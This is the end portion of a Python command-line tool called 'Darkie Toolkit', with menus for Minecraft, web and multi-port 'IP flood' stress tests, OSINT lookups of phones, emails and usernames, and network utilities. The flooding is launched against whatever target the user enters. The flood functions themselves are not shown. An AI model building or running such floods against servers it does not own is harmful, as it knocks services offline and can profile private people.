                print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")

        if r.returncode == 0:
            print(f"\n  {c(SYM_CHECK + ' Host is alive', Fore.GREEN)}")
        else:
            print(f"\n  {c(SYM_X + ' Host unreachable or blocking ping', Fore.RED)}")
    except subprocess.TimeoutExpired:
        print(f"  {c(SYM_X + ' Ping timed out', Fore.RED)}")
    except Exception as e:
        print(f"  {c(SYM_X + f' Error: {e}', Fore.RED)}")
    print()


def net_traceroute():
    header_box("Traceroute", Fore.BLUE)
    target = input(f"  {c(f'Enter IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {c('No target provided.', Fore.RED)}")
        return

    print(f"\n  {c(f'Tracing route to {target}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    if platform.system().lower() == "windows":
        cmd = ["tracert", "-d", "-h", "20", target]
    else:
        cmd = ["traceroute", "-n", "-m", "20", target]

    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = r.stdout or r.stderr
        for line in output.splitlines()[:25]:
            if line.strip():
                print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"  {c('traceroute not installed.', Fore.YELLOW)}")
    except subprocess.TimeoutExpired:
        print(f"  {c(SYM_X + ' Traceroute timed out', Fore.RED)}")
    except Exception as e:
        print(f"  {c(SYM_X + f' Error: {e}', Fore.RED)}")
    print()


# ──────────────────────────────────────────────────────
#  MENU SYSTEM
# ──────────────────────────────────────────────────────

def normalize_url(url):
    url = url.strip()
    if not url:
        return None
    parsed = urlparse(url)
    if not parsed.scheme:
        choice = input(f"  {c(f'Use HTTPS? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
        if choice == "yes":
            url = "https://" + url
        else:
            url = "http://" + url
    return url


def menu_stress():
    while True:
        header_box("Stress Testing", Fore.RED)
        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Server Stress Test")
        print(f"  {c('[2]', Fore.GREEN)}  Web Server Stress Test")
        print(f"  {c('[3]', Fore.GREEN)}  IP Flood Test  {Fore.YELLOW}(Multi-Port VPS){N}")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()

        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

        if choice == "1":
            if not legal_warning("Minecraft"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue
            target = input(f"  {c(f'Enter server IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not target:
                print(f"  {c('No target.', Fore.RED)}")
                continue
            ip = resolve_domain(target)
            if ip is None:
                continue
            open_ports = nmap_scan(ip)
            if open_ports:
                print(f"\n  {c('Available ports:', Fore.CYAN)} {c(str(open_ports), Fore.GREEN)}")
                port_input = input(f"  {c(f'Enter port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565
            else:
                port_input = input(f"  {c(f'Enter port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565
            num_input = input(f"  {c(f'Packets (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_packets = int(num_input) if num_input.isdigit() else 500
            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {ip}:{port}  |  PACKETS: {num_packets}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            if input(f"\n  {c(f'Launch? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "yes":
                minecraft_stress(ip, port, num_packets)

        elif choice == "2":
            if not legal_warning("Web"):
                continue
            url = input(f"  {c(f'Enter URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not url:
                continue
            url = normalize_url(url)
            if url is None:
                continue
            num_input = input(f"  {c(f'Requests (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_requests = int(num_input) if num_input.isdigit() else 500
            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {url}  |  REQUESTS: {num_requests}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            if input(f"\n  {c(f'Launch? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "yes":
                http_stress(url, num_requests)

        elif choice == "3":
            if not legal_warning("IP"):
                continue
            ip_input = input(f"  {c(f'Enter target IP {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not ip_input:
                continue
            try:
                socket.inet_aton(ip_input)
            except OSError:
                print(f"  {c('Invalid IP.', Fore.RED)}")
                continue
            print(f"\n  {c('Port Selection:', Fore.CYAN)}")
            print(f"  {c('[a]', Fore.GREEN)}  Auto ({len(STRESS_PORTS)} ports)")
            print(f"  {c('[m]', Fore.GREEN)}  Manual entry")
            if input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "m":
                p_input = input(f"  {c(f'Ports (comma-separated) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                try:
                    ports = [int(p.strip()) for p in p_input.split(",") if p.strip()]
                except ValueError:
                    print(f"  {c('Invalid. Using defaults.', Fore.YELLOW)}")
                    ports = STRESS_PORTS[:]
            else:
                ports = STRESS_PORTS[:]
            num_input = input(f"  {c(f'Connections per port (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_conn = int(num_input) if num_input.isdigit() else 500
            total_conn = num_conn * len(ports)
            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {ip_input}  |  PORTS: {len(ports)}  |  CONNS: {total_conn}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            if input(f"\n  {c(f'Launch? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() == "yes":
                ip_stress(ip_input, ports, num_conn)

        elif choice.lower() == "b":
            break
        else:
            print(f"  {c('Invalid choice.', Fore.RED)}")


def menu_osint():
    while True:
        header_box("OSINT Reconnaissance", Fore.YELLOW)
        print(f"  {c('[1]', Fore.GREEN)}  Phone Number Deep Lookup")
        print(f"  {c('[2]', Fore.GREEN)}  Email Deep Lookup")
        print(f"  {c('[3]', Fore.GREEN)}  IP Geolocation")
        print(f"  {c('[4]', Fore.GREEN)}  DNS Enumeration")
        print(f"  {c('[5]', Fore.GREEN)}  Subdomain Discovery  {Fore.YELLOW}(wordlist: {len(SUBDOMAIN_WORDLIST)}){N}")
        print(f"  {c('[6]', Fore.GREEN)}  Social Media Username Search  {Fore.YELLOW}({len(SOCIAL_PLATFORMS)} platforms){N}")
        print(f"  {c('[7]', Fore.GREEN)}  Website Tech Recon")
        print(f"  {c('[8]', Fore.GREEN)}  Whois Lookup")
        print(f"  {c('[9]', Fore.MAGENTA)}  Web Recon & Pentest  {Fore.YELLOW}(Directory brute, Port scan, Security checks){N}")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()

        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

        actions = {
            "1": osint_phone,
            "2": osint_email,
            "3": osint_ipgeo,
            "4": osint_dns,
            "5": osint_subdomain,
            "6": osint_social,
            "7": osint_website,
            "8": osint_whois,
            "9": web_recon,
        }

        if choice.lower() == "b":
            break
        elif choice in actions:
            actions[choice]()
        else:
            print(f"  {c('Invalid choice.', Fore.RED)}")


def menu_telephone():
    while True:
        header_box("Telephone Tools", Fore.MAGENTA)
        print(f"  {c('[1]', Fore.GREEN)}  Number Analysis & Carrier Lookup")
        print(f"  {c('[2]', Fore.GREEN)}  Country Code Reference")
        print(f"  {c('[3]', Fore.GREEN)}  Number Formatting")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()

        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

        if choice == "1":
            tel_analyze()
        elif choice == "2":
            tel_country_codes()
        elif choice == "3":
            tel_format()
        elif choice.lower() == "b":
            break
        else:
            print(f"  {c('Invalid choice.', Fore.RED)}")


def menu_network():
    while True:
        header_box("Network Utilities", Fore.BLUE)
        print(f"  {c('[1]', Fore.GREEN)}  TCP Port Scanner")
        print(f"  {c('[2]', Fore.GREEN)}  SSL/TLS Certificate Checker")
        print(f"  {c('[3]', Fore.GREEN)}  HTTP Security Headers Analyzer")
        print(f"  {c('[4]', Fore.GREEN)}  Ping Sweep")
        print(f"  {c('[5]', Fore.GREEN)}  Traceroute")
        print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
        print()

        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

        if choice == "1":
            net_portscan()
        elif choice == "2":
            net_sslcheck()
        elif choice == "3":
            net_httpheaders()
        elif choice == "4":
            net_ping()
        elif choice == "5":
            net_traceroute()
        elif choice.lower() == "b":
            break
        else:
            print(f"  {c('Invalid choice.', Fore.RED)}")


def main():
    print_banner()

    while True:
        header_box("Darkie Toolkit v1.3 — Main Menu", Fore.CYAN)
        print(f"  {c('[1]', Fore.RED)}    Stress Testing  {Fore.YELLOW}(Minecraft, Web, IP Flood){N}")
        print(f"  {c('[2]', Fore.YELLOW)}  OSINT Recon  {Fore.YELLOW}(Phone, Email, Geo, DNS, Subdomain, Social, Web, Web Recon){N}")
        print(f"  {c('[3]', Fore.MAGENTA)}  Telephone Tools  {Fore.YELLOW}(Analysis, Codes, Formatting){N}")
        print(f"  {c('[4]', Fore.BLUE)}   Network Utilities  {Fore.YELLOW}(Scan, SSL, Headers, Ping, Trace){N}")
        print(f"  {c('[q]', Fore.RED)}    Quit")
        print()

        choice = input(f"  {c(f'Select module {SYM_PROMPT} ', Fore.CYAN)}").strip()

        if choice == "1":
            menu_stress()
        elif choice == "2":
            menu_osint()
        elif choice == "3":
            menu_telephone()
        elif choice == "4":
            menu_network()
        elif choice.lower() == "q":
            print(f"\n  {c('Goodbye! Stay ethical.', Fore.GREEN)}\n")
            break
        else:
            print(f"  {c('Invalid choice.', Fore.RED)}")


if __name__ == "__main__":
    main()
